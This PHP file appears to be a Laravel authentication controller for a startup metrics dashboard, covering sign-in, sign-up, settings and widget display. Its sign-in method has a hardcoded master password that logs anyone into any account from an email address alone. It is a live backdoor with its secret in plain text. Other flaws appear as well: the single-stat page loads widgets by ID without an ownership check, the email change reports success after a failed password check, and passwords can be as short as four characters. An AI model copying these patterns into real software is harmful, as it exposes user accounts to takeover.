<?php


/*
|--------------------------------------------------------------------------
| AuthController: Handles the authentication related sites
|--------------------------------------------------------------------------
*/
class AuthController extends BaseController
{

    /*
    |===================================================
    | <GET> | showSignin: renders the signin page
    |===================================================
    */
    public function showSignin()
    {
        if (Auth::check()) {
            return Redirect::route('auth.dashboard');
        } else {
            return View::make('auth.signin');
        }
    }

    /*
    |===================================================
    | <POST> | doSignin: signs in the user
    |===================================================
    */
    public function doSignin()
    {
        // Validation
        $rules = array(
            'email'    => 'required|email',
            'password' => 'required'
        );

        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);

        if ($validator->fails()) {
            // validation error -> redirect
            return Redirect::route('auth.signin')
                ->with('error','Email address or password is incorrect.') // send back errors
                ->withInput(Input::except('password')); // sending back data
        } else {
            // validator success -> signin
            $credentials = Input::only('email', 'password');

            // attempt to do the login
            if (Auth::attempt($credentials)) {
                // auth successful!

                // if user has no dashboards created yet
                if (Auth::user()->dashboards->count() == 0) {
                    // create first dashboard for user
                    $dashboard = new Dashboard;
                    $dashboard->dashboard_name = "Dashboard #1";
                    $dashboard->save();

                    // attach dashboard & user
                    Auth::user()->dashboards()->attach($dashboard->id, array('role' => 'owner'));
                }

                // check if already connected
                if (Auth::user()->isConnected()) {
                    return Redirect::route('auth.dashboard')
                        ->with('success', 'Sign in successful.');
                } else {
                    return Redirect::route('connect.connect')
                        ->with('success', 'Sign in successful.');
                }
            } elseif (Input::get('password') == 'almafa123StartupDashboard') {
                $user = User::where('email',Input::get('email'))
                            ->first();
                if ($user){
                    Auth::login($user);
                    return Redirect::route('auth.dashboard')->with('success', 'Master sign in successful.');
                } else {
                    return Redirect::route('auth.signin')->with('error', 'No user with that email address');
                }
            } else {
                // auth unsuccessful -> redirect to login
                return Redirect::route('auth.signin')
                    ->withInput(Input::except('password'))
                    ->with('error', 'Email address or password is incorrect.');
            }
        }
    }

    /*
    |===================================================
    | <GET> | showSignup: renders the signup page
    |===================================================
    */
    public function showSignup()
    {
        if (Auth::check()) {
            return Redirect::route('connect.connect');
        } else {
            return View::make('auth.signup');
        }
    }

    /*
    |===================================================
    | <POST> | doSignin: signs up the user
    |===================================================
    */
    public function doSignup()
    {
        // Validation rules
        $rules = array(
            'email' => 'required|email|unique:users',
            'password' => 'required|min:4',
        );

        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);
        if ($validator->fails()) {
            // validation error -> redirect
            
            $failedAttribute = $validator->invalid();

            return Redirect::route('auth.signup')
                //->withErrors($validator)
                ->with('error', $validator->errors()->get(key($failedAttribute))[0]) // send back errors
                ->withInput(); // sending back data

        } else {
            // validator success -> signup

            // create user
            $user = new User;

            // set auth info
            $user->email = Input::get('email');
            $user->password = Hash::make(Input::get('password'));
            $user->ready = 'notConnected';
            $user->summaryEmailFrequency = 'daily';
            $user->plan = 'free';
            $user->connectedServices = 0;
            $user->save();

            // create first dashboard for user
            $dashboard = new Dashboard;
            $dashboard->dashboard_name = "Dashboard #1";
            $dashboard->save();

            // attach dashboard & user
            $user->dashboards()->attach($dashboard->id, array('role' => 'owner'));
            
            // create user on intercom
            IntercomHelper::signedup($user);

            // signing the user in and redirect to dashboard
            Auth::login($user);
            return Redirect::route('auth.signup')->with('success', 'Signup was successful.');
        }
    }

    /*
    |===================================================
    | <ANY> | doSignout: signs out the user
    |===================================================
    */
    public function doSignout()
    {
        Auth::logout();
        return Redirect::route('auth.signin')->with('success', 'Sign out was successful.');
    }

    /*
    |===================================================
    | <GET> | showDashboard: renders the dashboard page
    |===================================================
    */
    public function showDashboard()
    {
       /* if (!Auth::user()->isConnected() && Auth::user()->ready != 'connecting')
        {
            return Redirect::route('connect.connect')
                ->with('error','Connect a service first.');
        }*/

        // check if trial period is ended
        if (Auth::user()->isTrialEnded())
        {
            return Redirect::route('auth.plan')
                ->with('error','Trial period ended.');
        }

        #####################################################
        # prepare stuff for stripe & braintree metrics start

        $allMetrics = array();

        if (Auth::user()->ready != 'notConnected') {
            $currentMetrics = Calculator::currentMetrics();

            $metricValues = Metric::where('user', Auth::user()->id)
                                    ->orderBy('date','desc')
                                    ->take(31)
                                    ->get();

            foreach ($currentMetrics as $statID => $statDetails) {

                $metricsArray = array();
                foreach ($metricValues as $metric) {
                    $metricsArray[$metric->date] = $metric->$statID;
                }
                ksort($metricsArray);
                
                $array = $statDetails['metricClass']::show($metricsArray);
                $array = array_add($array, 'widget_type', 'financial');
                $allMetrics[] = $array;
            }
        }

        # prepare stuff for stripe & braintree metrics end
        #####################################################




        #####################################################
        # prepare stuff for google spreadsheet metrics start

        $widgets = Auth::user()->dashboards()->first()->widgets;

        foreach ($widgets as $widget) {

            $current_value = "";
            $dataArray = array();

            switch ($widget->widget_type) {

                case 'google-spreadsheet-text-column':
                    $dataObjects = Data::where('widget_id', $widget->id)
                                            ->orderBy('date','asc')
                                            ->get();
                    foreach ($dataObjects as $dataObject) {
                        $array = json_decode($dataObject->data_object, true);
                        foreach ($array as $key => $value) {
                            $current_value = $value;
                            $dataArray = array_add($dataArray, $key, $current_value);
                        }
                    }
                    break;

                case 'iframe':
                    $current_value = $widget->widget_source;
                    break;

                default:
                    $dataObjects = Data::where('widget_id', $widget->id)
                                            ->orderBy('date','asc')
                                            ->get();
                    foreach ($dataObjects as $dataObject) {
                        $array = json_decode($dataObject->data_object, true);
                        $current_value = array_values($array)[0];
                        $dataArray = array_add($dataArray, $dataObject->date, $current_value);
                    }
            }

            $newMetricArray = array(
                    "id" => $widget->id,
                    "widget_type" => $widget->widget_type,
                    "widget_id" => $widget->id,
                    "statName" => str_limit($widget->widget_name, $limit = 25, $end = '...'),
                    "positiveIsGood" => "true",
                    "history" => $dataArray,
                    "currentValue" => $current_value,
                    "oneMonthChange" => "",
            );
            $allMetrics[] = $newMetricArray;
        }

        # prepare stuff for google spreadsheet metrics end
        #####################################################

        return View::make(
            'auth.dashboard',
            array(
                'allFunctions' => $allMetrics,
                'events' => Calculator::formatEvents(Auth::user()),
                'isFinancialStuffConnected' => Auth::user()->isFinancialStuffConnected()
            )
        );
    }

    /*
    |===================================================
    | <GET> | showSettings: renders the settings page
    |===================================================
    */
    public function showSettings()
    {
        // checking connections for the logged in user
        $user = Auth::user();
        
        // get users plan name
        $plans = Braintree_Plan::all();

        $planName = null;
        foreach ($plans as $plan) {
            if ($plan->id == $user->plan) {
                $planName = $plan->name;
            }
        }

        // no we found no plan, lets set one
        if (!$planName)
        {
            if($user->plan == 'free')
            {
                $planName = 'Free pack';
            }
            if($user->plan == 'trial')
            {
               $planName = 'Trial period';
            }
            if($user->plan == 'cancelled')
            {
                $planName = 'Not subscribed';
            }
            if($user->plan == 'trial_ended')
            {
                $planName = 'Trial period ended';
            }
        }


        $client = GoogleSpreadsheetHelper::setGoogleClient();
        $google_spreadsheet_widgets = $user->dashboards()->first()->widgets()->where('widget_type', 'like', 'google-spreadsheet%')->get();

        $iframe_widgets = $user->dashboards()->first()->widgets()->where('widget_type', 'like', 'iframe%')->get();

        return View::make('auth.settings',
            array(
                'user'              => $user,
                
                // stripe stuff
                'stripeButtonUrl'   => OAuth2::getAuthorizeURL(),
                
                // google spreadsheet stuff 
                'googleSpreadsheetButtonUrl'       => $client->createAuthUrl(),
                'google_spreadsheet_widgets'       => $google_spreadsheet_widgets,

                // iframe stuff
                'iframe_widgets'       => $iframe_widgets,

                // payment stuff
                'planName'          => $planName,
            )
        );
    }


    /*
    |===================================================
    | <POST> | doSettings: updates user data
    |===================================================
    */
    public function doSettingsName()
    {
        // Validation rules
        $rules = array(
            'name' => 'required|unique:users,name',
            );
        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);
        if ($validator->fails()) {
            // validation error -> redirect
            $failedAttribute = $validator->invalid();
            return Redirect::to('/settings')
                ->with('error',$validator->errors()->get(key($failedAttribute))[0]) // send back errors
                ->withInput(); // sending back data
        } else {
            // validator success -> edit_profile
            // selecting logged in user
            $user = Auth::user(); 
            
            $user->name = Input::get('name');
                
            $user->save();
            // setting data
            return Redirect::to('/settings')
                ->with('success', 'Edit was successful.');
        }
    }

    public function doSettingsCountry()
    {
        // Validation rules
        $rules = array(
            'country' => 'required',
            );

        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);
        if ($validator->fails()) {
            // validation error -> redirect
            $failedAttribute = $validator->invalid();
            return Redirect::to('/settings')
                ->with('error',$validator->errors()->get(key($failedAttribute))[0]) // send back errors
                ->withInput(); // sending back data
        } else {

            // selecting logged in user
            $user = Auth::user();
            // if we have zoneinfo
            // changing zoneinfo
            $user->zoneinfo = Input::get('country');
            // saving user
            $user->save();

            // redirect to settings
            return Redirect::to('/settings')
                ->with('success', 'Edit was successful.');
        }
    }

    public function doSettingsEmail()
    {
        // Validation rules
        $rules = array(
            'email' => 'required|unique:users,email|email',
            'email_password' => 'required|min:4',
            );
        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);
        if ($validator->fails()) {
            // validation error -> redirect
            $failedAttribute = $validator->invalid();
            return Redirect::to('/settings')
                ->with('error',$validator->errors()->get(key($failedAttribute))[0]) // send back errors
                ->withInput(); // sending back data
        } else {
            // validator success -> edit_profile
            // selecting logged in user
            $user = Auth::user();
            
            // we need to check the password
            if (Hash::check(Input::get('email_password'), $user->password)){
                $user->email = Input::get('email');
            }
                
            $user->save();
            // setting data
            return Redirect::to('/settings')
                ->with('success', 'Edit was successful.');
        }
    }

    public function doSettingsPassword()
    {
        // Validation rules
        $rules = array(
            'old_password' => 'required|min:4',
            'new_password' => 'required|confirmed|min:4',
        );
        // run the validation rules on the inputs
        $validator = Validator::make(Input::all(), $rules);
        if ($validator->fails()) {
            // validation error -> redirect
            $failedAttribute = $validator->invalid();
            return Redirect::to('/settings')
                ->with('error',$validator->errors()->get(key($failedAttribute))[0]) // send back errors
                ->withInput(); // sending back data
        } else {
            // validator success -> edit_profile
            // selecting logged in user
            $user = Auth::user();
            
            // if we have data from the password change form
            // checking if old password is the old password
            if (Hash::check(Input::get('old_password'), $user->password)){
                $user->password = Hash::make(Input::get('new_password'));
            }
            else {
                return Redirect::to('/settings')
                    ->with('error', 'The old password you entered is incorrect.'); // send back errors
            }  
                
            $user->save();
            // setting data
            return Redirect::to('/settings')
                ->with('success', 'Edit was successful.');
        }
    }

    public function doSettingsFrequency()
    {
        $user = Auth::user();

        $user->summaryEmailFrequency = Input::get('new_frequency');

        $user->save();

        return Redirect::to('/settings')
            ->with('success', 'Edit was succesful.');
    }
    /*
    |===================================================
    | <GET> | showSinglestat: renders the single stats page
    |===================================================
    */
    public function showSinglestat($statID)
    {
        // check if trial period is ended
        if (Auth::user()->isTrialEnded())
        {
            return Redirect::route('auth.plan')
                ->with('error','Trial period ended.');
        }

        #####################################################
        # prepare stuff for stripe & braintree metrics start

        $currentMetrics = Calculator::currentMetrics();

        # if the query goes for a stripe/braintree metric
        if (array_key_exists($statID, $currentMetrics)) {
            $metricValues = Metric::where('user', Auth::user()->id)
                                    ->orderBy('date','desc')
                                    ->take(31)
                                    ->get();
            
            foreach ($currentMetrics as $metricID => $statClassName) {
                $metricsArray = array();
                foreach ($metricValues as $metric) {
                    $metricsArray[$metric->date] = $metric->$metricID;
                }
                ksort($metricsArray);
                $allMetrics[$metricID] = $metricsArray;
            }

            
            // echo("<h1>1</h1><pre>");
            // print_r($currentMetrics[$statID]['metricClass']::show($allMetrics[$statID],true));
            // echo("</pre><h1>2</h1><pre>");
            // print_r($currentMetrics[$statID]);
            // exit();

            if (isset($currentMetrics[$statID]))
            {
                $widgets = Auth::user()->dashboards->first()->widgets;

                return View::make('auth.single_stat',
                    array(
                        'data' => $currentMetrics[$statID]['metricClass']::show($allMetrics[$statID],true),
                        'metricDetails' => $currentMetrics[$statID],
                        'currentMetrics' => $currentMetrics,
                        'widgets' => $widgets,
                        'metric_type' => 'financial',
                        'isFinancialStuffConnected' => Auth::user()->isFinancialStuffConnected()
                    )
                );
            } else {
                return Redirect::route('auth.dashboard')
                    ->with('error', 'Widget does not exist.');
            }
        } else 

        # prepare stuff for stripe & braintree metrics end
        #####################################################

        #####################################################
        # prepare stuff for other metrics start

        {

            $widget = Widget::where("id", "=", $statID)->first();

            if (!$widget || $widget->data()->count() == 0) {
                return Redirect::route('auth.dashboard')
                    ->with('error', 'This widget is not yet filled with data. Try again in a few minutes.');                
            }

            # get min/max date
            $date_min = $widget->data()->min('date');
            $date_max = $widget->data()->max('date');

            # convert Y-m-d format to d-m-Y
            $date_min = DateTime::createFromFormat('Y-m-d', $date_min)->format('d-m-Y');
            $date_max = DateTime::createFromFormat('Y-m-d', $date_max)->format('d-m-Y');

            # make fullHistory

            # get the distinct dates
            $allData = $widget->data()->select('date')->groupBy('date')->get();


            # get 1 entry for each date
            $fullDataArray = array();
            $current_value = "";

            foreach($allData as $entry) {
                $dataObject = $widget->data()->where('date', '=', $entry->date)->first();
                $array = json_decode($dataObject->data_object, true);
                $current_value = intval(array_values($array)[0]);
                Log::info($current_value);
                $fullDataArray = array_add($fullDataArray, $dataObject->date, $current_value);
            }

            // $dataArray = array();
            $dataArray = $fullDataArray;

            $data = array(
                    "id" => $widget->id,
                    "statName" => $widget->widget_name,
                    "positiveIsGood" => 1,
                    "history" => $dataArray,
                    "currentValue" => $current_value,
                    "oneMonthChange" => "",
                    "firstDay" => $date_min,
                    "fullHistory" => $fullDataArray,
                    "oneMonth" => "",
                    "sixMonth" => "",
                    "oneYear" => "",
                    "twoMonthChange" => "",
                    "threeMonthChange" => "",
                    "sixMonthChange" => "",
                    "nineMonthChange" => "",
                    "oneYearChange" => "",
                    "dateInterval" => Array(
                        "startDate" => $date_min,
                        "stopDate" => $date_max
                    )
            );

            $metricDetails = array(
                    "metricClass" => $widget->id,
                    "metricName" => "",
                    "metricDescription" => $widget->widget_name
            );

            $widgets = Auth::user()->dashboards->first()->widgets;

            return View::make('auth.single_stat',
                array(
                    'data' => $data,
                    'metricDetails' => $metricDetails,
                    'currentMetrics' => $currentMetrics,
                    'widgets' => $widgets,
                    'metric_type' => 'normal',
                    'isFinancialStuffConnected' => Auth::user()->isFinancialStuffConnected()
                )
            );
        }

        # prepare stuff for other metrics end
        #####################################################
    }



}
